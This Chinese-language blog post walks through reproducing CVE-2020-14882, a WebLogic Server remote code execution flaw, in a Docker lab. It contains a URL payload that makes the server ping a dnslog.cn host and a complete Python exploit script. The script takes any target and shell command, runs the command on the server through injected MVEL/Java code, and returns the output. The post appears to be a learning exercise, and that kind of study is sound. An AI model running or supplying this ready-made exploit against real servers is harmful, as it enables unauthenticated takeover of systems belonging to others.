  * 未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。

  1. 用docker搭建的环境 ../vulhub/weblogic/CVE-2020-14882
  2. 访问登录界面http://192.168.81.129:7001/console/login/LoginForm.jsp![image](https://image.3001.net/images/20210401/1617261062_6065720699ff42bb9a664.png!small)  
3.pyload是
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27ping
0cs5r3.dnslog.cn%27);%22);  
![image](https://image.3001.net/images/20210401/1617263615_60657bffc6f5dc1045064.png!small)我也是根据网上各大佬发布的文章弄得,可是在dnslog中并没有记录,最后我进到docker容器中进行ping命令,发现在docker中不能ping哈哈哈哈哈![image](https://image.3001.net/images/20210401/1617264859_606580db4df2add7986d8.png!small)

  3. 既然不能ping那就用python进行复现(还好自己了解点python,要不然就撞墙了)

    
    
    #!/usr/bin/python3
    import requests
    import sys
    import http.client
    
    http.client.HTTPConnection._http_vsn = 10
    http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
    if len(sys.argv) != 3:
    print("[+] Usage : python3 exploit.py http(s)://target:7001 command")
    exit()
    target = sys.argv[1]
    command = sys.argv[2]
    request = requests.session()
    headers_cmd = {
    'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
    'cmd': command,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    cmd="""/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); 
    weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); 
    java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
    field.setAccessible(true);
    Object obj = field.get(adapter);
    weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); 
    String cmd = req.getHeader("cmd");
    String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
    if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("%5C%5CA").next(); 
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();} 
    currentThread.interrupt();')
    """
    url_cmd = target+cmd
    response = request.get(url_cmd, headers=headers_cmd, verify=False)
    print(response.text)
    print("[+] Attack complete!")
    

![image](https://image.3001.net/images/20210401/1617264880_606580f094517469a8708.png!small)  
最后我想如果不用docker搭建环境,直接用系统是不是就可以ping了...

